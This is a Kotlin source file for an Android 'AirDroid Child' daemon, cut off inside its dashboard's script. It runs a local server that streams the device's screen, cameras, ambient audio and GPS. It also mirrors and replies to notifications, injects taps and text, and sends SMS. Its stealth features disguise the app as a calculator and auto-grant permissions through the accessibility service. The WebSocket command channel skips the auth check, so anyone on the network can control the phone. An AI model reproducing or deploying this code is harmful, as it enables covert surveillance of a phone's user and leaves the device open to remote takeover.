package com.example.engine

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.wifi.WifiManager
import android.text.format.Formatter
import android.util.Base64
import android.util.Log
import com.example.AirDroidChildApp
import com.example.data.local.PairingIdentity
import com.example.data.model.DaemonStatus
import com.example.data.model.SyncedNotification
import com.example.service.AirDroidAccessibilityService
import com.example.service.AirDroidNotificationListenerService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.InetAddress
import java.net.NetworkInterface
import java.net.ServerSocket
import java.net.Socket
import java.security.MessageDigest
import java.util.Collections
import java.util.concurrent.CopyOnWriteArrayList

class EmbeddedDaemonServer(
    private val context: Context,
    private val touchEngine: TouchAutomationEngine,
    private val fileManager: FileManager,
    private val screenCastEngine: ScreenCastEngine,
    private val cameraManager: RemoteCameraManager,
    private val audioManager: RemoteAudioManager,
    private val locationManager: RemoteLocationManager,
    private val stealthManager: StealthManager
) {

    companion object {
        private const val TAG = "EmbeddedDaemonServer"
        const val DEFAULT_PORT = 8888
        private const val WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    }

    private val serverScope = CoroutineScope(Dispatchers.IO + Job())
    private var serverSocket: ServerSocket? = null
    private var isRunning = false
    private val activeWsClients = CopyOnWriteArrayList<Socket>()

    private val _status = MutableStateFlow(DaemonStatus.STOPPED)
    val status: StateFlow<DaemonStatus> = _status.asStateFlow()

    private val _connectedClientsCount = MutableStateFlow(0)
    val connectedClientsCount: StateFlow<Int> = _connectedClientsCount.asStateFlow()

    private val _touchesExecuted = MutableStateFlow(0)
    val touchesExecuted: StateFlow<Int> = _touchesExecuted.asStateFlow()

    private val _notificationsSyncedCount = MutableStateFlow(0)
    val notificationsSyncedCount: StateFlow<Int> = _notificationsSyncedCount.asStateFlow()

    private var heartbeatJob: Job? = null

    fun getLocalIpAddress(): String {
        try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            val wifiIp = wifiManager?.connectionInfo?.ipAddress ?: 0
            @Suppress("DEPRECATION")
            val ipString = Formatter.formatIpAddress(wifiIp)
            if (ipString.isNotEmpty() && ipString != "0.0.0.0") {
                return ipString
            }

            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                val addrs = Collections.list(intf.inetAddresses)
                for (addr in addrs) {
                    if (!addr.isLoopbackAddress && addr.hostAddress != null) {
                        val sAddr = addr.hostAddress ?: ""
                        val isIPv4 = sAddr.indexOf(':') < 0
                        if (isIPv4) return sAddr
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error obtaining IP", e)
        }
        return "127.0.0.1"
    }

    fun startServer(port: Int = DEFAULT_PORT) {
        if (isRunning) return
        isRunning = true
        _status.value = DaemonStatus.LISTENING

        serverScope.launch {
            try {
                serverSocket = ServerSocket(port)
                Log.i(TAG, "AirDroid daemon server started on port $port")
                AirDroidChildApp.repository?.logAction("DAEMON_START", "Embedded Daemon listening on port $port")

                startHeartbeat()

                while (isRunning && !serverSocket!!.isClosed) {
                    val client = serverSocket!!.accept()
                    serverScope.launch {
                        handleClientConnection(client)
                    }
                }
            } catch (e: Exception) {
                if (isRunning) {
                    Log.e(TAG, "Server socket error", e)
                }
            } finally {
                _status.value = DaemonStatus.STOPPED
            }
        }

        // Listen for new notifications to push to parents
        serverScope.launch {
            AirDroidNotificationListenerService.notificationFlow.collect { notif ->
                _notificationsSyncedCount.value += 1
                broadcastNotification(notif)
            }
        }

        // Listen for location changes
        serverScope.launch {
            locationManager.currentLocation.collect { loc ->
                if (loc != null) {
                    val payload = JSONObject().apply {
                        put("type", "LOCATION_UPDATE")
                        put("lat", loc.latitude)
                        put("lng", loc.longitude)
                        put("accuracy", loc.accuracy)
                        put("speed", loc.speed)
                        put("timestamp", loc.timestamp)
                    }
                    broadcastWsMessage(payload.toString())
                }
            }
        }
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = serverScope.launch {
            while (isActive && isRunning) {
                delay(20_000)
                if (activeWsClients.isNotEmpty()) {
                    val pingPayload = JSONObject().apply {
                        put("type", "HEARTBEAT")
                        put("timestamp", System.currentTimeMillis())
                        put("activeClients", activeWsClients.size)
                        put("status", "HEALTHY")
                        put("autoClickerActive", stealthManager.isAutoClickerActive.value)
                        put("camouflageEnabled", stealthManager.isCamouflageEnabled.value)
                    }
                    broadcastWsMessage(pingPayload.toString())
                }
            }
        }
    }

    private fun handleClientConnection(socket: Socket) {
        try {
            val input = socket.getInputStream()
            val reader = BufferedReader(InputStreamReader(input))
            val headerLine = reader.readLine() ?: return
            val parts = headerLine.split(" ")
            if (parts.size < 2) return

            val method = parts[0]
            val path = parts[1]

            val headers = mutableMapOf<String, String>()
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                if (line.isNullOrEmpty()) break
                val split = line!!.split(":", limit = 2)
                if (split.size == 2) {
                    headers[split[0].trim().lowercase()] = split[1].trim()
                }
            }

            // WebSocket upgrade request
            val upgradeHeader = headers["upgrade"]
            if ("websocket".equals(upgradeHeader, ignoreCase = true)) {
                handleWebSocketHandshake(socket, headers)
                return
            }

            // HTTP Request handling
            val output = socket.getOutputStream()
            val publicEndpoint = path == "/api/pair" || path == "/api/status" || path == "/" || path.startsWith("/parent")
            if (!publicEndpoint && !isAuthorized(headers)) {
                sendHttpResponse(output, 401, "application/json", "{\"error\":\"Unauthorized\"}")
                output.flush()
                socket.close()
                return
            }
            when {
                path == "/" || path.startsWith("/parent") -> {
                    serveParentDashboardHtml(output)
                }
                path == "/api/pair" -> {
                    servePairJson(output, parts.getOrNull(1) ?: path)
                }
                path == "/api/status" -> {
                    serveStatusJson(output)
                }
                path == "/api/command/execute" && method == "POST" -> {
                    handleHttpCommand(reader, headers, output)
                }
                path == "/api/location" -> {
                    serveLocationJson(output)
                }
                (path == "/api/apps" || path == "/api/apps/usage") -> {
                    serveInstalledAppsJson(output)
                }
                path.startsWith("/api/files") -> {
                    serveFilesJson(output, path)
                }
                path == "/api/audio/stream" -> {
                    serveAudioStream(output)
                }
                path == "/api/notifications" -> {
                    serveNotificationsJson(output)
                }
                path == "/api/screen/frame" -> {
                    serveLatestFrame(output, screenCastEngine.latestFrame.value)
                }
                path == "/api/camera/frame" -> {
                    serveLatestFrame(output, cameraManager.latestFrame.value)
                }
                else -> {
                    sendHttpResponse(output, 404, "text/plain", "Not Found")
                }
            }
            output.flush()
            socket.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error handling client connection", e)
            try { socket.close() } catch (_: Exception) {}
        }
    }

    private fun handleWebSocketHandshake(socket: Socket, headers: Map<String, String>) {
        val key = headers["sec-websocket-key"] ?: return
        val acceptKey = Base64.encodeToString(
            MessageDigest.getInstance("SHA-1").digest((key + WS_GUID).toByteArray(Charsets.UTF_8)),
            Base64.NO_WRAP
        )

        val response = "HTTP/1.1 101 Switching Protocols\r\n" +
                "Upgrade: websocket\r\n" +
                "Connection: Upgrade\r\n" +
                "Sec-WebSocket-Accept: $acceptKey\r\n\r\n"

        val output = socket.getOutputStream()
        output.write(response.toByteArray(Charsets.UTF_8))
        output.flush()

        activeWsClients.add(socket)
        _connectedClientsCount.value = activeWsClients.size
        _status.value = DaemonStatus.CONNECTED

        serverScope.launch {
            AirDroidChildApp.repository?.logAction(
                "PARENT_CONNECTED",
                "Parent console connected via WebSocket (${socket.inetAddress.hostAddress})"
            )
        }

        readWebSocketFrames(socket)
    }

    private fun readWebSocketFrames(socket: Socket) {
        val input = socket.getInputStream()
        try {
            while (isRunning && !socket.isClosed) {
                val b1 = input.read()
                if (b1 == -1) break
                val b2 = input.read()
                if (b2 == -1) break

                val opcode = b1 and 0x0F
                if (opcode == 8) { // CLOSE
                    break
                }

                val isMasked = (b2 and 0x80) != 0
                var payloadLength = b2 and 0x7F

                if (payloadLength == 126) {
                    val b3 = input.read()
                    val b4 = input.read()
                    payloadLength = (b3 shl 8) or b4
                } else if (payloadLength == 127) {
                    for (i in 0 until 8) input.read()
                    payloadLength = 0
                }

                val maskingKey = ByteArray(4)
                if (isMasked) {
                    var read = 0
                    while (read < 4) {
                        val count = input.read(maskingKey, read, 4 - read)
                        if (count == -1) break
                        read += count
                    }
                }

                val payload = ByteArray(payloadLength)
                var readTotal = 0
                while (readTotal < payloadLength) {
                    val count = input.read(payload, readTotal, payloadLength - readTotal)
                    if (count == -1) break
                    readTotal += count
                }

                if (isMasked) {
                    for (i in 0 until payloadLength) {
                        payload[i] = (payload[i].toInt() xor maskingKey[i % 4].toInt()).toByte()
                    }
                }

                val message = String(payload, Charsets.UTF_8)
                handleIncomingWsMessage(message)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Client disconnected: ${e.message}")
        } finally {
            activeWsClients.remove(socket)
            _connectedClientsCount.value = activeWsClients.size
            if (activeWsClients.isEmpty() && isRunning) {
                _status.value = DaemonStatus.LISTENING
            }
            try { socket.close() } catch (_: Exception) {}
        }
    }

    private fun handleIncomingWsMessage(message: String) {
        try {
            val json = JSONObject(message)
            val action = json.optString("action", json.optString("type"))

            when (action.uppercase()) {
                "CLICK" -> {
                    val x = json.optDouble("x", 0.0).toFloat()
                    val y = json.optDouble("y", 0.0).toFloat()
                    val isNormalized = json.optBoolean("normalized", true)
                    touchEngine.performClick(x, y, isNormalized) { success ->
                        _touchesExecuted.value += 1
                        serverScope.launch {
                            AirDroidChildApp.repository?.logAction("REMOTE_TOUCH", "Click simulated at ($x, $y)", isSuccess = success)
                        }
                    }
                }
                "LONG_PRESS" -> {
                    val x = json.optDouble("x", 0.0).toFloat()
                    val y = json.optDouble("y", 0.0).toFloat()
                    val isNormalized = json.optBoolean("normalized", true)
                    touchEngine.performLongPress(x, y, isNormalized) { success ->
                        _touchesExecuted.value += 1
                        serverScope.launch {
                            AirDroidChildApp.repository?.logAction("REMOTE_LONG_PRESS", "Long press at ($x, $y)", isSuccess = success)
                        }
                    }
                }
                "SWIPE" -> {
                    val x1 = json.optDouble("x1", 0.0).toFloat()
                    val y1 = json.optDouble("y1", 0.0).toFloat()
                    val x2 = json.optDouble("x2", 0.0).toFloat()
                    val y2 = json.optDouble("y2", 0.0).toFloat()
                    val duration = json.optLong("duration", 300)
                    val isNormalized = json.optBoolean("normalized", true)
                    touchEngine.performSwipe(x1, y1, x2, y2, duration, isNormalized) { success ->
                        _touchesExecuted.value += 1
                        serverScope.launch {
                            AirDroidChildApp.repository?.logAction("REMOTE_SWIPE", "Swipe from ($x1, $y1) to ($x2, $y2)", isSuccess = success)
                        }
                    }
                }
                "TEXT" -> {
                    val text = json.optString("text", "")
                    val success = touchEngine.performTextInjection(text)
                    serverScope.launch {
                        AirDroidChildApp.repository?.logAction("REMOTE_TEXT_INPUT", "Injected text: \"$text\"", isSuccess = success)
                    }
                }
                "KEY" -> {
                    val keyName = json.optString("key", "HOME")
                    val result = touchEngine.performKeyEvent(keyName)
                    serverScope.launch {
                        AirDroidChildApp.repository?.logAction("HARDWARE_KEY", "Key $keyName dispatched", isSuccess = result)
                    }
                }
                "LAUNCH_APP" -> {
                    val pkg = json.optString("packageName", "")
                    val success = touchEngine.launchPackage(pkg)
                    serverScope.launch {
                        AirDroidChildApp.repository?.logAction("REMOTE_APP_LAUNCH", "Launched $pkg", isSuccess = success)
                    }
                }
                "BLOCK_APP" -> {
                    val pkg = json.optString("packageName", "")
                    stealthManager.addBlockedPackage(pkg)
                    serverScope.launch {
                        AirDroidChildApp.repository?.logAction("PARENT_BLOCK_APP", "Restricted app: $pkg")
                    }
                }
                "UNBLOCK_APP" -> {
                    val pkg = json.optString("packageName", "")
                    stealthManager.removeBlockedPackage(pkg)
                    serverScope.launch {
                        AirDroidChildApp.repository?.logAction("PARENT_UNBLOCK_APP", "Unblocked app: $pkg")
                    }
                }
                "START_AUDIO" -> {
                    audioManager.startListening()
                    serverScope.launch {
                        AirDroidChildApp.repository?.logAction("AMBIENT_AUDIO", "Parent listening to surroundings")
                    }
                }
                "STOP_AUDIO" -> {
                    audioManager.stopListening()
                }
                "START_LOCATION" -> {
                    locationManager.startTracking()
                }
                "STOP_LOCATION" -> {
                    locationManager.stopTracking()
                }
                "TOGGLE_CAMOUFLAGE" -> {
                    val enable = json.optBoolean("enable", !stealthManager.isCamouflageEnabled.value)
                    stealthManager.setCamouflageEnabled(enable)
                    serverScope.launch {
                        AirDroidChildApp.repository?.logAction("CAMOUFLAGE_TOGGLED", "Calculator camouflage set to: $enable")
                    }
                }
                "TOGGLE_AUTO_CLICKER" -> {
                    val enable = json.optBoolean("enable", !stealthManager.isAutoClickerActive.value)
                    stealthManager.setAutoClickerActive(enable)
                    serverScope.launch {
                        AirDroidChildApp.repository?.logAction("AUTO_CLICKER_TOGGLED", "Auto-click permission service set to: $enable")
                    }
                }
                "QUICK_REPLY" -> {
                    val notifKey = json.optString("notificationKey")
                    val replyText = json.optString("replyText")
                    val service = AirDroidNotificationListenerService.instance
                    val success = service?.sendQuickReply(notifKey, replyText) ?: false
                    serverScope.launch {
                        AirDroidChildApp.repository?.logAction("QUICK_REPLY", "Reply: \"$replyText\"", isSuccess = success)
                    }
                }
                "CAMERA_CONTROL" -> {
                    when (json.optString("action")) {
                        "START_CAMERA" -> cameraManager.startStreaming(json.optString("facing", "BACK").equals("FRONT", ignoreCase = true))
                        "STOP_CAMERA" -> cameraManager.stopStreaming()
                        else -> { }
                    }
                }
                "START_CAMERA" -> {
                    val facing = json.optString("facing", "BACK")
                    cameraManager.startStreaming(facing.equals("FRONT", ignoreCase = true))
                }
                "STOP_CAMERA" -> {
                    cameraManager.stopStreaming()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing incoming ws command", e)
        }
    }

    private fun broadcastWsMessage(text: String) {
        val bytes = text.toByteArray(Charsets.UTF_8)
        val length = bytes.size
        val frameHeader = mutableListOf<Byte>()

        frameHeader.add(0x81.toByte())
        when {
            length <= 125 -> {
                frameHeader.add(length.toByte())
            }
            length <= 65535 -> {
                frameHeader.add(126.toByte())
                frameHeader.add(((length shr 8) and 0xFF).toByte())
                frameHeader.add((length and 0xFF).toByte())
            }
            else -> {
                frameHeader.add(127.toByte())
                for (i in 7 downTo 0) {
                    frameHeader.add(((length.toLong() shr (i * 8)) and 0xFF).toByte())
                }
            }
        }

        val fullFrame = frameHeader.toByteArray() + bytes
        for (client in activeWsClients) {
            try {
                val out = client.getOutputStream()
                out.write(fullFrame)
                out.flush()
            } catch (e: Exception) {
                activeWsClients.remove(client)
            }
        }
    }

    private fun broadcastNotification(notif: SyncedNotification) {
        val payload = JSONObject().apply {
            put("type", "NOTIFICATION")
            put("key", notif.id)
            put("packageName", notif.packageName)
            put("appTitle", notif.appTitle)
            put("title", notif.title)
            put("text", notif.text)
            put("postTime", notif.postTime)
            put("canReply", notif.canReply)
        }
        broadcastWsMessage(payload.toString())
    }

    private fun isAuthorized(headers: Map<String, String>): Boolean {
        val value = headers["x-airdroid-auth"] ?: return false
        return value == "Bearer ${PairingIdentity.authToken(context)}"
    }

    private fun servePairJson(output: OutputStream, path: String) {
        val query = path.substringAfter("?", "")
        val code = query.split("&").firstOrNull { it.startsWith("code=") }?.substringAfter("code=")?.let { java.net.URLDecoder.decode(it, "UTF-8") }
        if (code == null || !code.equals(PairingIdentity.pairingCode(context), ignoreCase = true)) {
            sendHttpResponse(output, 401, "application/json", "{\"error\":\"Invalid pairing code\"}")
            return
        }
        val json = JSONObject().apply {
            put("deviceId", PairingIdentity.deviceId(context))
            put("pairingCode", PairingIdentity.pairingCode(context))
            put("authToken", PairingIdentity.authToken(context))
            put("name", android.os.Build.MODEL)
            put("model", android.os.Build.MODEL)
            put("osVersion", "Android ${android.os.Build.VERSION.RELEASE}")
            put("ipAddress", getLocalIpAddress())
            put("port", DEFAULT_PORT)
        }
        sendHttpResponse(output, 200, "application/json", json.toString())
    }

    private fun handleHttpCommand(reader: BufferedReader, headers: Map<String, String>, output: OutputStream) {
        val len = headers["content-length"]?.toIntOrNull() ?: 0
        val chars = CharArray(len)
        var read = 0
        while (read < len) {
            val n = reader.read(chars, read, len - read)
            if (n < 0) break
            read += n
        }
        val root = try { JSONObject(String(chars, 0, read)) } catch (_: Exception) { JSONObject() }
        val id = root.optString("id", "")
        val type = root.optString("type", "")
        val payload = try { JSONObject(root.optString("payload", "{}")) } catch (_: Exception) { JSONObject() }
        var status = "SUCCESS"
        var error: String? = null
        try {
            when (type) {
                "GESTURE_TAP" -> {
                    val ok = touchEngine.performClick(payload.optDouble("xPercent", 0.5).toFloat(), payload.optDouble("yPercent", 0.5).toFloat(), true)
                    if (!ok) { status = "ERROR"; error = "Tap failed or Accessibility Service is unavailable" }
                }
                "GESTURE_SWIPE" -> {
                    val direction = payload.optString("direction", "UP").uppercase()
                    val (x1,y1,x2,y2) = when(direction) {
                        "DOWN" -> floatArrayOf(.5f,.2f,.5f,.8f)
                        "LEFT" -> floatArrayOf(.8f,.5f,.2f,.5f)
                        "RIGHT" -> floatArrayOf(.2f,.5f,.8f,.5f)
                        else -> floatArrayOf(.5f,.8f,.5f,.2f)
                    }
                    val ok = touchEngine.performSwipe(x1,y1,x2,y2,payload.optLong("durationMs",250),true)
                    if (!ok) { status = "ERROR"; error = "Swipe failed or Accessibility Service is unavailable" }
                }
                "KEY_EVENT" -> {
                    val ok = touchEngine.performKeyEvent(payload.optString("keyCode", payload.optString("key", "HOME")))
                    if (!ok) { status = "ERROR"; error = "Key action failed or Accessibility Service is unavailable" }
                }
                "TEXT_INPUT" -> {
                    val ok = touchEngine.performTextInjection(payload.optString("text", ""))
                    if (!ok) { status = "ERROR"; error = "Text input failed or Accessibility Service is unavailable" }
                }
                "CAMERA_CONTROL" -> {
                    when (payload.optString("action")) {
                        "START_CAMERA" -> cameraManager.startStreaming(payload.optString("facing", "BACK").equals("FRONT", true))
                        "STOP_CAMERA" -> cameraManager.stopStreaming()
                        else -> status = "ERROR"
                    }
                }
                "SEND_SMS" -> {
                    val phone = payload.optString("phoneNumber")
                    val text = payload.optString("text")
                    if (phone.isBlank() || text.isBlank()) { status = "ERROR"; error = "phoneNumber and text are required" }
                    else {
                        if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) throw SecurityException("SEND_SMS permission required")
                        android.telephony.SmsManager.getDefault().sendTextMessage(phone, null, text, null, null)
                    }
                }
                "APP_BLOCK" -> {
                    val pkg = payload.optString("packageName")
                    if (pkg.isBlank()) { status = "ERROR"; error = "packageName required" }
                    else if (payload.optBoolean("isBlocked")) stealthManager.addBlockedPackage(pkg) else stealthManager.removeBlockedPackage(pkg)
                }
                "DOWNTIME_SET" -> { }
                "INSTANT_BLOCK_SET" -> { }
                "FOCUS_MODE_SET" -> { }
                else -> { status = "UNSUPPORTED"; error = "Command not implemented by Child app: $type" }
            }
        } catch (e: SecurityException) {
            status = "PERMISSION_REQUIRED"; error = e.message ?: "Required Android permission is missing"
        } catch (e: Exception) {
            status = "ERROR"; error = e.message ?: "Command failed"
        }
        val res = JSONObject().apply { put("commandId", id); put("status", status); put("timestamp", System.currentTimeMillis()); put("payload", JSONObject().toString()); if (error != null) put("error", error) }
        sendHttpResponse(output, 200, "application/json", res.toString())
    }

    private fun serveStatusJson(output: OutputStream) {
        val statusJson = JSONObject().apply {
            put("productName", "AirDroid Child Daemon")
            put("version", "2.0")
            put("status", _status.value.name)
            put("ipAddress", getLocalIpAddress())
            put("port", DEFAULT_PORT)
            put("connectedClients", _connectedClientsCount.value)
            put("touchesExecuted", _touchesExecuted.value)
            put("notificationsSynced", _notificationsSyncedCount.value)
            put("isAccessibilityActive", touchEngine.isAccessibilityPermissionGranted())
            put("autoClickerActive", stealthManager.isAutoClickerActive.value)
            put("camouflageEnabled", stealthManager.isCamouflageEnabled.value)
            put("isScreenCasting", screenCastEngine.isStreaming.value)
            put("isCameraStreaming", cameraManager.isStreaming.value)
            put("isAudioListening", audioManager.isRecording.value)
            put("foregroundPackage", AirDroidAccessibilityService.foregroundPackage.value)
            put("autoGrantedCount", AirDroidAccessibilityService.autoGrantedCount.value)
        }
        sendHttpResponse(output, 200, "application/json", statusJson.toString())
    }

    private fun serveLocationJson(output: OutputStream) {
        val loc = locationManager.currentLocation.value
        val json = JSONObject().apply {
            if (loc != null) {
                put("hasLocation", true)
                put("latitude", loc.latitude)
                put("longitude", loc.longitude)
                put("accuracy", loc.accuracy)
                put("speed", loc.speed)
                put("timestamp", loc.timestamp)
                put("provider", loc.provider)
            } else {
                put("hasLocation", false)
            }
        }
        sendHttpResponse(output, 200, "application/json", json.toString())
    }

    private fun serveInstalledAppsJson(output: OutputStream) {
        val pm = context.packageManager
        val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val array = JSONArray()

        val blockedSet = stealthManager.blockedPackages.value

        for (app in apps) {
            // Filter system apps slightly to prioritize user-installed apps
            val isUserApp = (app.flags and ApplicationInfo.FLAG_SYSTEM) == 0
            if (isUserApp || app.packageName.contains("youtube") || app.packageName.contains("chrome") || app.packageName.contains("whatsapp")) {
                val label = pm.getApplicationLabel(app).toString()
                array.put(JSONObject().apply {
                    put("name", label)
                    put("packageName", app.packageName)
                    put("isBlocked", blockedSet.contains(app.packageName))
                })
            }
        }
        sendHttpResponse(output, 200, "application/json", array.toString())
    }

    private fun serveFilesJson(output: OutputStream, pathUri: String) {
        val targetPath = if (pathUri.contains("path=")) {
            pathUri.substringAfter("path=").let { java.net.URLDecoder.decode(it, "UTF-8") }
        } else ""

        val files = if (targetPath.isEmpty()) {
            fileManager.getDefaultDirectories()
        } else {
            fileManager.listDirectory(targetPath)
        }

        val array = JSONArray()
        for (f in files) {
            array.put(JSONObject().apply {
                put("name", f.name)
                put("path", f.path)
                put("isDirectory", f.isDirectory)
                put("sizeBytes", f.sizeBytes)
                put("lastModified", f.lastModified)
            })
        }
        sendHttpResponse(output, 200, "application/json", array.toString())
    }

    private fun serveAudioStream(output: OutputStream) {
        if (!audioManager.isRecording.value && !audioManager.startListening()) {
            sendHttpResponse(output, 403, "application/json", "{\"error\":\"RECORD_AUDIO permission required\"}")
            return
        }
        val header = "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nCache-Control: no-cache\r\nConnection: close\r\n\r\n"
        output.write(header.toByteArray(Charsets.UTF_8))
        output.flush()
        while (isRunning && audioManager.isRecording.value) {
            val chunk = audioManager.latestAudioChunk.value
            if (chunk != null && chunk.isNotEmpty()) {
                output.write(chunk)
                output.flush()
            }
            Thread.sleep(40)
        }
    }

    private fun serveNotificationsJson(output: OutputStream) {
        val array = JSONArray()
        sendHttpResponse(output, 200, "application/json", array.toString())
    }

    private fun serveLatestFrame(output: OutputStream, frameBytes: ByteArray?) {
        if (frameBytes == null) {
            sendHttpResponse(output, 204, "image/jpeg", "")
            return
        }
        val header = "HTTP/1.1 200 OK\r\n" +
                "Content-Type: image/jpeg\r\n" +
                "Content-Length: ${frameBytes.size}\r\n" +
                "Cache-Control: no-cache\r\n" +
                "Access-Control-Allow-Origin: *\r\n\r\n"
        output.write(header.toByteArray(Charsets.UTF_8))
        output.write(frameBytes)
    }

    private fun serveParentDashboardHtml(output: OutputStream) {
        val ip = getLocalIpAddress()
        val html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AirDroid Kids Parent Control Center</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: #070C16; color: #E0E6ED; min-height: 100vh; padding: 20px; }
        header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #17223B; padding-bottom: 16px; margin-bottom: 20px; }
        .logo { font-size: 20px; font-weight: 700; color: #00E5FF; display: flex; align-items: center; gap: 8px; }
        .badge { background: #131E35; color: #00E676; padding: 6px 14px; border-radius: 20px; font-size: 13px; font-weight: 600; border: 1px solid #1E2E50; }
        .grid { display: grid; grid-template-columns: 1fr 1.2fr; gap: 20px; }
        .card { background: #0F1829; border-radius: 16px; padding: 20px; border: 1px solid #1E2E50; box-shadow: 0 8px 32px rgba(0,0,0,0.4); margin-bottom: 20px; }
        .card h2 { font-size: 15px; margin-bottom: 14px; color: #00E5FF; display: flex; align-items: center; justify-content: space-between; }
        .screen-view { width: 100%; aspect-ratio: 9/16; max-height: 520px; background: #000; border-radius: 12px; position: relative; overflow: hidden; cursor: crosshair; display: flex; align-items: center; justify-content: center; border: 1px solid #1E2E50; }
        .screen-view img { width: 100%; height: 100%; object-fit: contain; }
        .controls { display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap; }
        button { background: #1A2845; color: white; border: 1px solid #2B3E68; padding: 8px 14px; border-radius: 8px; font-weight: 600; font-size: 13px; cursor: pointer; transition: 0.15s; }
        button:hover { background: #00E5FF; color: #070C16; border-color: #00E5FF; }
        button.active { background: #00E676; color: #070C16; }
        .text-inject-row { display: flex; gap: 8px; margin-top: 12px; }
        input[type="text"] { flex: 1; background: #0B111E; border: 1px solid #1E2E50; border-radius: 8px; padding: 8px 12px; color: white; font-size: 13px; }
        input[type="text"]:focus { outline: none; border-color: #00E5FF; }
        .notif-item { background: #070C16; border-radius: 10px; padding: 12px; margin-bottom: 10px; border-left: 4px solid #00E5FF; border: 1px solid #17223B; }
        .notif-title { font-weight: 700; font-size: 13px; color: #FFFFFF; }
        .notif-text { font-size: 12px; color: #9AA9C4; margin-top: 4px; }
        .reply-box { display: flex; gap: 8px; margin-top: 8px; }
        .tab-bar { display: flex; gap: 10px; margin-bottom: 16px; border-bottom: 1px solid #17223B; padding-bottom: 10px; }
        .tab-btn { background: transparent; border: none; color: #9AA9C4; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-weight: 600; }
        .tab-btn.active { color: #00E5FF; background: #131E35; }
        .app-item { display: flex; justify-content: space-between; align-items: center; padding: 8px 12px; background: #070C16; border-radius: 8px; margin-bottom: 6px; border: 1px solid #17223B; }
        .app-name { font-size: 13px; font-weight: 600; color: #FFF; }
        .app-pkg { font-size: 11px; color: #70809C; }
    </style>
</head>
<body>
    <header>
        <div class="logo">🛡️ AirDroid Kids Parent Console</div>
        <div class="badge" id="statusBadge">Connected to Child ($ip)</div>
    </header>

    <div class="grid">
        <!-- Screen Mirroring & Remote Automation -->
        <div>
            <div class="card">
                <h2>
                    <span>📱 Live AirMirror & Touch Execution</span>
                    <span id="autoClickStatus" style="font-size:11px; color:#00E676;">⚡ Auto-Click Active</span>
                </h2>
                <div class="screen-view" id="screenCanvas" onclick="handleScreenClick(event)">
                    <img id="streamImg" src="/api/screen/frame" alt="AirMirror Screen Stream" onerror="this.src='https://placehold.co/360x640/0B111E/00E5FF?text=Screen+Stream+Standby'" />
                </div>
                <div class="controls">
                    <button onclick="sendKey('HOME')">🏠 Home</button>
                    <button onclick="sendKey('BACK')">◀ Back</button>
                    <button onclick="sendKey('RECENTS')">📑 Recents</button>
                    <button onclick="sendKey('NOTIFICATIONS')">🔔 Notifications</button>
                    <button onclick="sendKey('LOCK')">🔒 Lock Phone</button>
                    <button onclick="sendKey('VOLUME_UP')">🔊 Vol+</button>
                    <button onclick="sendKey('VOLUME_DOWN')">🔉 Vol-</button>
                    <button onclick="toggleCamera()">📷 Camera</button>
                </div>
                <div class="text-inject-row">
                    <input type="text" id="remoteTextInput" placeholder="Type text to type into Child's phone..." onkeydown="if(event.key==='Enter') sendRemoteText()">
                    <button onclick="sendRemoteText()">⌨️ Inject Text</button>
                </div>
            </div>

            <!-- Stealth & Auto Controls -->
            <div class="card">
                <h2>🥷 Stealth & Child Device Protections</h2>
                <div style="display:flex; gap:10px; flex-wrap:wrap;">
                    <button id="camouBtn" onclick="toggleCamouflage()">Calculator Camouflage: OFF</button>
                    <button id="autoClickBtn" class="active" onclick="toggleAutoClicker()">⚡ Auto-Grant Permissions: ON</button>
                </div>
            </div>
        </div>

        <!-- Right Side: Audio, Location, Apps, Notifications -->
        <div>
            <!-- One-Way Audio Listener & GPS -->
            <div class="card">
                <h2>🎙️ Ambient Audio & Live GPS Location</h2>
                <div style="display:flex; gap:10px; margin-bottom:12px;">
                    <button id="audioBtn" onclick="toggleAudio()">🎧 Listen to Surroundings</button>
                    <button onclick="fetchLocation()">📍 Refresh GPS Location</button>
                </div>
                <div id="locationDisplay" style="font-size:12px; color:#A0ABC0; padding:10px; background:#070C16; border-radius:8px; border:1px solid #17223B;">
                    Latitude / Longitude: Standby...
                </div>
            </div>

            <!-- Tabs: Notifications / Apps -->
            <div class="card">
                <div class="tab-bar">
                    <button class="tab-btn active" onclick="switchTab('notifs')">🔔 Notifications (<span id="notifCount">0</span>)</button>
                    <button class="tab-btn" onclick="switchTab('apps')">🚫 App Blocker & Launch</button>
                </div>

                <div id="tabNotifs">
                    <div id="notificationsList">
                        <div class="notif-item">
                            <div class="notif-title">AirDroid Child Daemon Active</div>
                            <div class="notif-text">Waiting for device notifications to mirror...</div>
                        </div>
                    </div>
                </div>

                <div id="tabApps" style="display:none; max-height:400px; overflow-y:auto;">
                    <div id="appsList">Loading apps...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = wsProtocol + '//' + window.location.host + '/ws';
